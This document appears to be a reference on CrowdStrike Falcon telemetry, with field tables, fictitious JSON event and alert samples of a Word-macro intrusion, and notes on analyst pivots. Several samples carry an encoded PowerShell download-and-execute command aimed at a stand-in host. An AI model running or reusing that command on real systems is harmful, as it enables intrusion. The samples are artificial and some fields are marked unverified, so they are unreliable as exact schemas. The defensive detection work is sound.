| `NewExecutableWritten` / `NewScriptWritten` | `TargetFileName`, `ContextBaseFileName`, `ContextImageFileName`, `ContextProcessId`, `ContextThreadId`, `ContextTimeStamp`, `DesiredAccess`, `FileAttributes`, `FileEcpBitmask`, `FileIdentifier`, `FileObject`, `Information`, `IrpFlags`, `MajorFunction`, `MinorFunction`, `OperationFlags`, `Options`, `ShareAccess`, `Status` (no hash on Windows lines) |
| `CommandHistory` | `CommandHistory` (console commands joined by a separator character), `CommandCount`, `CommandCountMax`, `CommandSequence`, `FirstCommand`, `LastAdded`, `LastDisplayed`, `ApplicationName`, `TargetProcessId`, `AuthenticationId`, `LogonType`, `UserName` |
| `ScriptControlScanTelemetry` | `ScriptContent`, `ScriptContentName`, `ContentSHA256HashData`, `OriginalContentLength`, `ScriptingLanguageId`, `HostProcessType`, `ImageFileName`, `CommandLine`, `ParentImageFileName`, `ParentCommandLine`, `GrandparentImageFileName`, `GrandparentCommandLine`, `ContextProcessId`, `ContextThreadId`, `ContextTimeStamp` (enum values of `ScriptingLanguageId` / `HostProcessType` **UNVERIFIED**) |
| `AsepValueUpdate` | `RegObjectName`, `RegValueName`, `RegStringValue`, `RegType`, `RegOperationType`, `AsepClass`, `AsepFlags`, `AsepIndex`, `AsepValueType`, `Data1`, `TargetFileName`, `TargetCommandLineParameters`, `TargetSHA256HashData`, `AuthenticationId`, `TokenType`, `ContextProcessId`, `ContextThreadId`, `ContextTimeStamp` |
| `RegGenericValueUpdate` / `RegSystemConfigValueUpdate` | `RegObjectName`, `RegValueName`, `RegStringValue`, `RegType`, `RegOperationType`, `RegClassification`, `RegClassificationFlags`, `RegClassificationIndex`, `AuthenticationId`, `TokenType`, `ContextProcessId`, `ContextThreadId`, `ContextTimeStamp` |
| `EndOfProcess` | `TargetProcessId`, `ParentProcessId`, `ContextProcessId`, `RawProcessId`, `ProcessStartTime`, `ContextTimeStamp`, `ExitCode`, `SHA256HashData`, `UserSid`, `ImageSubsystem`, `CycleTime`, `KernelTime`, `UserTime`, `MaxThreadCount`, `ConHostId`, `ConHostProcessId`, `ContextThreadId` (the 2020 V14/V15 lines also had ~45 activity counters such as `DnsRequestCount`, `NetworkConnectCount`, `NewExecutableWrittenCount` — absent on the 2025 line) |
| `TerminateProcess` | Linux only in samples: `TargetProcessId`, `RawProcessId`, `ContextProcessId`, `ContextThreadId`, `ContextTimeStamp` |
| `ProcessBlocked` | No raw line retrieved — field list **UNVERIFIED** |

---

## 4. Realistic JSON samples (fictitious)

Story: on 2026-09-29 user `dana.levi` on `FIN-WS-0142` (NEXACORP) opens a malicious Word document. WINWORD spawns
encoded PowerShell, which resolves and connects to `cdn-update-sync.com` (185.225.73.41:443) and drops `msupd.exe`,
which it then launches.

Linkage used by every sample (same `aid` `4d92d2adf9009775a446ce0fe2689915`, `cid` `c4e1f8a2…4a5b`):

| Sample | Time (sensor, UTC) | Key IDs |
|---|---|---|
| 4.7 UserLogon | 06:03:31.317 | `AuthenticationId` 2338751, `UserSid` …-1604 → `UserName` dana.levi |
| (WINWORD PR2, not shown) | 08:11:05 | `TargetProcessId` 289734651298 |
| 4.1 PR2 powershell.exe | 08:14:22.402 | `TargetProcessId` 289741187433, `ParentProcessId` 289734651298, `AuthenticationId` 2338751 |
| 4.2 DnsRequest | 08:14:23.051 | `ContextProcessId` 289741187433 |
| 4.3 NetworkConnectIP4 | 08:14:23.212 | `ContextProcessId` 289741187433 |
| 4.4 PeFileWritten msupd.exe | 08:14:25.880 | `ContextProcessId` 289741187433, `SHA256HashData` e3375bf9… |
| 4.8 PR2 msupd.exe | 08:14:27.115 | `TargetProcessId` 289748810026, `ParentProcessId` 289741187433, `SHA256HashData` e3375bf9… |
| 4.9 aidmaster | record `Time` 08:12:58 | `aid` → `ComputerName` FIN-WS-0142, OU, site, OS |
| 4.10 userinfo | record `_time` 08:02:00 | `UserSid_readable` …-1604 → `NEXACORP\dana.levi` |

Field counts vs. the newest real raw line of the same type (section 1): PR2 42 (real Windows V19 = 40 + current-sensor
`ComputerName`/`LocalAddressIP4`), DnsRequest 29 (real 28 incl. `CNAMERecords`, which is omitted because the answer has
no CNAME; + `ComputerName`/`LocalAddressIP4`), NetworkConnectIP4 25 (real 25 minus the unexplained `RemoteAddressString`
+ `ComputerName`), PeFileWritten 46 (real 44 + `ComputerName`/`LocalAddressIP4`), UserLogon 36 (real 34 +
`ComputerName`/`LocalAddressIP4`), aidmaster 32 (real 32), userinfo 15 (real 15). Nothing was added that is not on a
real line; host-context fields are flagged in the notes under each sample. (Numbering of 4.5/4.6 is kept stable;
the extra FDR samples 4.7–4.10 follow the detection samples.)

### 4.1 FDR — ProcessRollup2 (encoded PowerShell from Word)

Notes: `ComputerName` on a Windows PR2 is confirmed by the Google SecOps parser change (2026-04-09) and the Linux PR2V12
raw line; `LocalAddressIP4` on a *Windows PR2* line is not yet seen (it is on Linux PR2 and most 2025 Windows event
types) — **UNVERIFIED** for this exact type. `AuthenticodeHashData` and `Tags` values are fictitious. Name suffix `V19`
is the newest confirmed Windows version (2024).

```json
{"AuthenticationId":"2338751","AuthenticodeHashData":"4f1d6b0e2a7c95d3816e0b4a9c2f7d58e13a6b90c4d27f8e5a1b3c69d0e48f72","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","ImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageSubsystem":"3","IntegrityLevel":"8192","LocalAddressIP4":"10.20.14.87","MD5HashData":"6ac5e4c66d56a4c2a2fab09e18bcc23f","ParentAuthenticationId":"2338751","ParentBaseFileName":"WINWORD.EXE","ParentProcessId":"289734651298","ProcessCreateFlags":"1024","ProcessEndTime":"","ProcessParameterFlags":"24577","ProcessStartTime":"1790669662.402","ProcessSxsFlags":"64","RawProcessId":"7412","SHA1HashData":"0000000000000000000000000000000000000000","SHA256HashData":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","SessionId":"1","SignInfoFlags":"8683538","SourceProcessId":"289734651298","SourceThreadId":"118473902216","Tags":"25, 27, 40, 151, 874, 924, 12094627905582, 12094627906234, 211106232533012","TargetProcessId":"289741187433","TokenType":"1","UserSid":"S-1-5-21-3623811015-3361044348-30300820-1604","WindowFlags":"128","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"ProcessRollup2","id":"6a1f0c9e-9b42-11f1-8a6e-02b7c41d5e21","name":"ProcessRollup2V19","timestamp":"1790669662417"}
```

### 4.2 FDR — DnsRequest (PowerShell resolves C2)

Notes: name `DnsRequestV5` is the newest confirmed Windows version (real line, Jan 2025). `ComputerName` on DnsRequest:
Google SecOps parser 2026-01-20. `LocalAddressIP4` on this type **UNVERIFIED** (pattern of current sensors).
`DnsResponseType` value meaning **UNVERIFIED**.

```json
{"ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ContextBaseFileName":"powershell.exe","ContextProcessId":"289741187433","ContextThreadId":"118473955081","ContextTimeStamp":"1790669663.051","DnsRequestCount":"1","DnsResponseType":"1","DomainName":"cdn-update-sync.com","DualRequest":"0","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","FirstIP4Record":"185.225.73.41","IP4Records":"185.225.73.41;","InterfaceIndex":"0","LocalAddressIP4":"10.20.14.87","QueryStatus":"0","RequestType":"1","RespondingDnsServer":"10.20.0.10","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"DnsRequest","id":"6a2c7d41-9b42-11f1-9d13-02b7c41d5e21","name":"DnsRequestV5","timestamp":"1790669663188"}
```

### 4.3 FDR — NetworkConnectIP4 (outbound to C2)

Notes: `ContextThreadId` removed (absent on every real Windows network line). `LocalAddressIP4` here is the socket's
local address (always present on network events). `ComputerName` on NetworkConnectIP4 is **UNVERIFIED** (seen on
`FirewallRuleIP4Matched` and other 2025 events, not on a raw NetworkConnectIP4 line). Name suffix `V5` is the newest
confirmed (2020); the current suffix is not public — **UNVERIFIED**.

```json
{"ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ConnectionDirection":"0","ConnectionFlags":"0","ContextBaseFileName":"powershell.exe","ContextProcessId":"289741187433","ContextTimeStamp":"1790669663.212","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","InContext":"0","LocalAddressIP4":"10.20.14.87","LocalPort":"52817","Protocol":"6","RemoteAddressIP4":"185.225.73.41","RemotePort":"443","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"NetworkConnectIP4","id":"6a2f13b8-9b42-11f1-b5a0-02b7c41d5e21","name":"NetworkConnectIP4V5","timestamp":"1790669663341"}
```

### 4.4 FDR — PeFileWritten (dropped payload)

Notes: key set = the 2025 Windows PeFileWritten line (44 keys) + `ComputerName`/`LocalAddressIP4` (both present on the
real 2025 `PngFileWrittenV3` line, a sibling *FileWritten event). PE-header values describe a fictitious x64 GUI binary.
`FileCategory` `"6"` is copied from the real line; its enum meaning is **UNVERIFIED**. Name suffix `V14` is the newest
confirmed (2020) — **UNVERIFIED** for current sensors.

```json
{"AuthenticationId":"2338751","ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ContextBaseFileName":"powershell.exe","ContextImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ContextProcessId":"289741187433","ContextThreadId":"118473955081","ContextTimeStamp":"1790669665.880","DiskParentDeviceInstanceId":"PCI\\VEN_144D&DEV_A80A&SUBSYS_0B0F1028&REV_00\\4&2c3c1a3e&0&0008","DllCharacteristics":"33120","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","FileCategory":"6","FileEcpBitmask":"0","FileIdentifier":"7a1c3e5f0b2d4f6e8a9c1b3d5e7f9a0b2c4d6e8f0a1b3c5d","FileObject":"0","FileOperatorSid":"S-1-5-21-3623811015-3361044348-30300820-1604","FileWrittenFlags":"0","ImageCheckSum":"0","ImageEntryPoint":"79552","ImageSubsystem":"2","ImageTimeStamp":"1789512380","IrpFlags":"0","IsOnNetwork":"0","IsOnRemovableDisk":"0","IsTransactedFile":"0","LocalAddressIP4":"10.20.14.87","MajorFunction":"0","MinorFunction":"0","ModuleCharacteristics":"34","OperationFlags":"0","SHA256HashData":"e3375bf9704fd511dd71fdd683ae439adfa8b22e697c1853d148c8ae0e627aed","Size":"318464","TargetFileName":"\\Device\\HarddiskVolume3\\ProgramData\\Microsoft\\Update\\msupd.exe","TokenType":"1","UserName":"dana.levi","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"PeFileWritten","id":"6a4e90d2-9b42-11f1-8c77-02b7c41d5e21","name":"PeFileWrittenV14","timestamp":"1790669666007"}
```

### 4.5 Alerts API v2 — one element of `resources` (endpoint IOA alert)

```json
{
  "agent_id": "4d92d2adf9009775a446ce0fe2689915",
  "aggregate_id": "aggind:4d92d2adf9009775a446ce0fe2689915:12884902151",
  "alleged_filetype": "exe",
  "cid": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
  "cloud_indicator": "false",
  "cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
  "composite_id": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "confidence": 80,
  "context_timestamp": "2026-09-29T08:14:22.402Z",
  "control_graph_id": "ctg:4d92d2adf9009775a446ce0fe2689915:12884902151",
  "created_timestamp": "2026-09-29T08:14:31.885124513Z",
  "data_domains": ["Endpoint"],
  "description": "An Office application launched PowerShell with an encoded command line. This is consistent with a malicious macro or embedded object. Review the process tree.",
  "device": {
    "agent_load_flags": "0",
    "agent_local_time": "2026-09-29T06:02:11.204Z",
    "agent_version": "7.29.19807.0",
    "cid": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
    "config_id_base": "65994763",
    "config_id_build": "19807",
    "config_id_platform": "3",
    "device_id": "4d92d2adf9009775a446ce0fe2689915",
    "external_ip": "213.57.121.34",
    "first_seen": "2025-11-03T09:41:27Z",
    "groups": ["5b8e2c41a9d74f30b6e1c0d29f7a3e84"],
    "hostinfo": {"active_directory_dn_display": ["Workstations", "Workstations\\Finance"], "domain": "NEXACORP.LOCAL"},
    "hostname": "FIN-WS-0142",
    "last_seen": "2026-09-29T08:12:58Z",
    "local_ip": "10.20.14.87",
    "mac_address": "3c-52-82-a1-6f-0d",
    "machine_domain": "NEXACORP.LOCAL",
    "major_version": "10",
    "minor_version": "0",
    "modified_timestamp": "2026-09-29T08:13:04Z",
    "os_version": "Windows 11",
    "ou": ["Finance", "Workstations"],
    "platform_id": "0",
    "platform_name": "Windows",
    "product_type": "1",
    "product_type_desc": "Workstation",
    "site_name": "TLV-HQ",
    "status": "normal",
    "system_manufacturer": "Dell Inc.",
    "system_product_name": "Latitude 5440"
  },
  "falcon_host_link": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209?_cid=c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
  "filename": "powershell.exe",
  "filepath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "grandparent_details": {
    "cmdline": "C:\\Windows\\Explorer.EXE",
    "filename": "explorer.exe",
    "filepath": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
    "local_process_id": "4128",
    "md5": "8a64f4da916c9f0e727104dc202168a3",
    "process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289712004871",
    "process_id": "289712004871",
    "sha256": "2217604cf31513e40cf073832b874cd3ff50bfe3ee77ddaa7172e443501749f6",
    "timestamp": "2026-09-29T06:03:40Z",
    "user_graph_id": "uid:4d92d2adf9009775a446ce0fe2689915:S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_name": "dana.levi"
  },
  "id": "ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "indicator_id": "ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
  "local_process_id": "7412",
  "logon_domain": "NEXACORP",
  "md5": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
  "name": "OfficeSpawnedEncodedPowerShell",
  "objective": "Follow Through",
  "parent_details": {
    "cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"",
    "filename": "WINWORD.EXE",
    "filepath": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "local_process_id": "5216",
    "md5": "b5427130eb0bcfc6bcbefd3d44f12104",
    "process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289734651298",
    "process_id": "289734651298",
    "sha256": "a80227f8606831d42d3535415b73721e08daf506051e2ec1ab7d4994d88780ca",
    "timestamp": "2026-09-29T08:11:05Z",
    "user_graph_id": "uid:4d92d2adf9009775a446ce0fe2689915:S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
    "user_name": "dana.levi"
  },
  "parent_process_id": "289734651298",
  "pattern_disposition": 0,
  "pattern_disposition_description": "Detection, standard detection.",
  "pattern_disposition_details": {"blocking_unsupported_or_disabled": false, "bootup_safeguard_enabled": false, "critical_process_disabled": false, "detect": false, "fs_operation_blocked": false, "handle_operation_downgraded": false, "inddet_mask": false, "indicator": false, "kill_action_failed": false, "kill_parent": false, "kill_process": false, "kill_subprocess": false, "operation_blocked": false, "policy_disabled": false, "process_blocked": false, "quarantine_file": false, "quarantine_machine": false, "registry_operation_blocked": false, "rooting": false, "sensor_only": false, "suspend_parent": false, "suspend_process": false},
  "pattern_id": 10197,
  "platform": "Windows",
  "process_end_time": "",
  "process_id": "289741187433",
  "process_start_time": "1790669662",
  "product": "epp",
  "scenario": "suspicious_activity",
  "severity": 70,
  "severity_name": "High",
  "sha1": "0000000000000000000000000000000000000000",
  "sha256": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
  "show_in_ui": true,
  "source_products": ["Falcon Insight"],
  "source_vendors": ["CrowdStrike"],
  "status": "new",
  "tactic": "Execution",
  "tactic_id": "TA0002",
  "technique": "PowerShell",
  "technique_id": "T1059.001",
  "timestamp": "2026-09-29T08:14:22.931Z",
  "tree_id": "12884902151",
  "tree_root": "289734651298",
  "triggering_process_graph_id": "pid:4d92d2adf9009775a446ce0fe2689915:289741187433",
  "type": "ldt",
  "updated_timestamp": "2026-09-29T08:14:31.885117302Z",
  "user_id": "S-1-5-21-3623811015-3361044348-30300820-1604",
  "user_name": "dana.levi"
}
```

### 4.6 Event Streams — EppDetectionSummaryEvent (alternative detection feed)

```json
{
  "metadata": {"customerIDString": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b", "offset": 884213, "eventType": "EppDetectionSummaryEvent", "eventCreationTime": 1790669671885, "version": "1.0"},
  "event": {
    "AgentId": "4d92d2adf9009775a446ce0fe2689915",
    "AggregateId": "aggind:4d92d2adf9009775a446ce0fe2689915:12884902151",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "CompositeId": "c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209",
    "DataDomains": "Endpoint",
    "Description": "An Office application launched PowerShell with an encoded command line. This is consistent with a malicious macro or embedded object. Review the process tree.",
    "FalconHostLink": "https://falcon.eu-1.crowdstrike.com/activity-v2/detections/c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b:ind:4d92d2adf9009775a446ce0fe2689915:289741187433-10197-1843209?_cid=c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b",
    "FileName": "powershell.exe",
    "FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "GrandParentCommandLine": "C:\\Windows\\Explorer.EXE",
    "GrandParentImageFileName": "explorer.exe",
    "GrandParentImageFilePath": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
    "HostGroups": "5b8e2c41a9d74f30b6e1c0d29f7a3e84",
    "Hostname": "FIN-WS-0142",
    "LocalIP": "10.20.14.87",
    "LocalIPv6": "",
    "LogonDomain": "NEXACORP",
    "MACAddress": "3c-52-82-a1-6f-0d",
    "MD5String": "6ac5e4c66d56a4c2a2fab09e18bcc23f",
    "Name": "OfficeSpawnedEncodedPowerShell",
    "Objective": "Follow Through",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"",
    "ParentImageFileName": "WINWORD.EXE",
    "ParentImageFilePath": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentProcessId": 289734651298,
    "PatternDispositionDescription": "Detection, standard detection.",
    "PatternDispositionFlags": {"Indicator": false, "Detect": false, "InddetMask": false, "SensorOnly": false, "Rooting": false, "KillProcess": false, "KillSubProcess": false, "QuarantineMachine": false, "QuarantineFile": false, "PolicyDisabled": false, "KillParent": false, "OperationBlocked": false, "ProcessBlocked": false, "RegistryOperationBlocked": false, "CriticalProcessDisabled": false, "BootupSafeguardEnabled": false, "FsOperationBlocked": false, "HandleOperationDowngraded": false, "KillActionFailed": false, "BlockingUnsupportedOrDisabled": false, "SuspendProcess": false, "SuspendParent": false},
    "PatternDispositionValue": 0,
    "PatternId": 10197,
    "ProcessEndTime": 0,
    "ProcessId": 289741187433,
    "ProcessStartTime": 1790669662,
    "SHA1String": "0000000000000000000000000000000000000000",
    "SHA256String": "9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55",
    "Severity": 70,
    "SeverityName": "High",
    "SourceProducts": "Falcon Insight",
    "SourceVendors": "CrowdStrike",
    "Tactic": "Execution",
    "Technique": "PowerShell",
    "Type": "ldt",
    "UserName": "dana.levi"
  }
}
```

### 4.7 FDR — UserLogon (dana.levi's interactive logon — source of the user name)

Notes: key set = the 2025 Windows UserLogon line (34 keys, incl. `PrivilegesBitmask`, `EnabledPrivilegesBitmask`,
`UserGroupsBitmask`, `EventOrigin`) + `ComputerName`/`LocalAddressIP4` (**UNVERIFIED** on this type). Its
`AuthenticationId` 2338751 is the LUID carried by 4.1, 4.4 and 4.8. Bitmask values, `UserFlags`, `RemoteAccount` and
`ClientComputerName` values are illustrative (**UNVERIFIED** semantics). Name suffix `V8` is the newest confirmed (2020)
— **UNVERIFIED** for current sensors.

```json
{"AuthenticationId":"2338751","AuthenticationPackage":"Kerberos","ClientComputerName":"FIN-WS-0142","ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","ContextProcessId":"289708312455","ContextThreadId":"118401226874","ContextTimeStamp":"1790661811.317","EffectiveTransmissionClass":"2","EnabledPrivilegesBitmask":"8388608","Entitlements":"15","EventOrigin":"1","LocalAddressIP4":"10.20.14.87","LogonDomain":"NEXACORP","LogonServer":"NEX-DC01","LogonTime":"1790661811.317","LogonType":"2","PasswordLastSet":"1781421730.512","PrivilegesBitmask":"1082130432","RemoteAccount":"1","UserFlags":"32","UserGroupsBitmask":"0","UserIsAdmin":"0","UserLogonFlags":"0","UserName":"dana.levi","UserPrincipal":"dana.levi@nexacorp.local","UserSid":"S-1-5-21-3623811015-3361044348-30300820-1604","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"UserLogon","id":"5f0d8a63-9b30-11f1-8e2b-02b7c41d5e21","name":"UserLogonV8","timestamp":"1790661812044"}
```

### 4.8 FDR — ProcessRollup2 (dropped msupd.exe launched by PowerShell)

Notes: same key set as 4.1. `ParentProcessId` = 4.1 `TargetProcessId`; `SourceThreadId` = the PowerShell thread seen
in 4.2–4.4; `SHA256HashData` = 4.4. `SignInfoFlags` `"0"` for an unsigned image is **UNVERIFIED**.

```json
{"AuthenticationId":"2338751","AuthenticodeHashData":"b7e40c19d2a6f8350e9c4d71a2b65f08c3e917d4a0f26b85e1c3d7a49f052e6b","CommandLine":"\"C:\\ProgramData\\Microsoft\\Update\\msupd.exe\" /svc","ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigStateHash":"2873364105","EffectiveTransmissionClass":"3","Entitlements":"15","EventOrigin":"1","ImageFileName":"\\Device\\HarddiskVolume3\\ProgramData\\Microsoft\\Update\\msupd.exe","ImageSubsystem":"2","IntegrityLevel":"8192","LocalAddressIP4":"10.20.14.87","MD5HashData":"3f9a1c7e5b2d4086a1e9c3b5d7f20a64","ParentAuthenticationId":"2338751","ParentBaseFileName":"powershell.exe","ParentProcessId":"289741187433","ProcessCreateFlags":"1024","ProcessEndTime":"","ProcessParameterFlags":"24577","ProcessStartTime":"1790669667.115","ProcessSxsFlags":"64","RawProcessId":"9036","SHA1HashData":"0000000000000000000000000000000000000000","SHA256HashData":"e3375bf9704fd511dd71fdd683ae439adfa8b22e697c1853d148c8ae0e627aed","SessionId":"1","SignInfoFlags":"0","SourceProcessId":"289741187433","SourceThreadId":"118473955081","Tags":"25, 27, 874, 12094627905582, 12094627906234","TargetProcessId":"289748810026","TokenType":"1","UserSid":"S-1-5-21-3623811015-3361044348-30300820-1604","WindowFlags":"128","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","event_simpleName":"ProcessRollup2","id":"6a5b2e17-9b42-11f1-a3d9-02b7c41d5e21","name":"ProcessRollup2V19","timestamp":"1790669667240"}
```

### 4.9 FDR secondary data — aidmaster record for FIN-WS-0142

Notes: key set = the real aidmaster lines (32 keys). An `aidmaster` record has no `event_simpleName`, `id` or
`timestamp`; `Time` is the record time. OU string encoding **UNVERIFIED**.

```json
{"AgentLoadFlags":"0","AgentLocalTime":"1790661731.204","AgentTimeOffset":"79.416","AgentVersion":"7.29.19807.0","BiosManufacturer":"Dell Inc.","BiosVersion":"1.18.0","ChassisType":"Laptop","City":"Tel Aviv","ComputerName":"FIN-WS-0142","ConfigBuild":"1007.3.0019807.1","ConfigIDBuild":"19807","Continent":"Asia","Country":"Israel","FalconGroupingTags":"-","FirstSeen":"1762162887.0","HostHiddenStatus":"Visible","MachineDomain":"NEXACORP.LOCAL","OU":"Finance;Workstations","PointerSize":"8","ProductType":"1","SensorGroupingTags":"-","ServicePackMajor":"0","SiteName":"TLV-HQ","SystemManufacturer":"Dell Inc.","SystemProductName":"Latitude 5440","Time":"1790669578.000","Timezone":"Asia/Jerusalem","Version":"Windows 11","aid":"4d92d2adf9009775a446ce0fe2689915","aip":"213.57.121.34","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win"}
```

### 4.10 FDR secondary data — userinfo record for dana.levi (Falcon Discover, Windows only)

Notes: key set = the real elastic `userinfo` line (15 keys). `User` uses the `DOMAIN\user` string form.

```json
{"AccountType":"Domain User","LastLoggedOnHost":"FIN-WS-0142","LocalAdminAccess":"No","LogonInfo":"Domain User Logon","LogonTime":"1790661811.317","LogonType":"Interactive","PasswordLastSet":"1781421730.512","User":"NEXACORP\\dana.levi","UserIsAdmin":"0","UserLogonFlags_decimal":"0","UserSid_readable":"S-1-5-21-3623811015-3361044348-30300820-1604","_time":"1790668920.448","cid":"c4e1f8a2b7d94e0f9a6b3c2d1e0f4a5b","event_platform":"Win","monthsincereset":"3.0"}
```

---

## 5. Investigation notes (how an analyst pivots)

- **Process tree**: ProcessRollup2.`TargetProcessId` is the node ID. Child PR2.`ParentProcessId` = parent's
  `TargetProcessId`. Every action event (DnsRequest, NetworkConnectIP4, *FileWritten, registry events) carries
  `ContextProcessId` = `TargetProcessId` of the actor. So: alert `process_id` → PR2 `TargetProcessId` →
  all events with that `ContextProcessId` (DNS 4.2, socket 4.3, file 4.4) and all PR2 with that `ParentProcessId`.
- `RawProcessId` / alert `local_process_id` is the OS PID — it is reused by Windows; never join on it across time.
- Host pivot: `aid` (FDR) = `agent_id` / `device.device_id` (alert) = `AgentId` (Event Streams). Hostname is
  resolved via the `aidmaster` record (4.9: `aid` → `ComputerName`, `MachineDomain`, `OU`, `SiteName`, `Version`,
  `ProductType`) in FDR — current-sensor raw lines also carry `ComputerName` directly, but OU/site/OS still need the
  join — `device.hostname` in alerts, `Hostname` in Event Streams. In NG-SIEM the same join is
  `match(file="aid_master_main.csv", field=[aid])`; in Splunk the FDR add-on adds `aid_computer_name`, `aid_ou`… .
- User pivot: PR2 `UserSid` + `AuthenticationId` → the `UserLogon` (4.7) / `UserIdentity` event with the same
  `AuthenticationId` (logon LUID) on the same `aid` gives `UserName`, `LogonDomain`, `LogonType`, `LogonServer`.
  Falcon Discover customers can also join `UserSid` → `userinfo.UserSid_readable` (4.10: `AccountType`,
  `LocalAdminAccess`, `LastLoggedOnHost`, `PasswordLastSet`). File events carry `UserName` + `FileOperatorSid` themselves.
- Dropped-file pivot: `PeFileWritten.SHA256HashData` (4.4) = `SHA256HashData` of the later PR2 (4.8), whose
  `ParentProcessId` = the writer's `TargetProcessId` — "written then executed by the same process" in two joins.
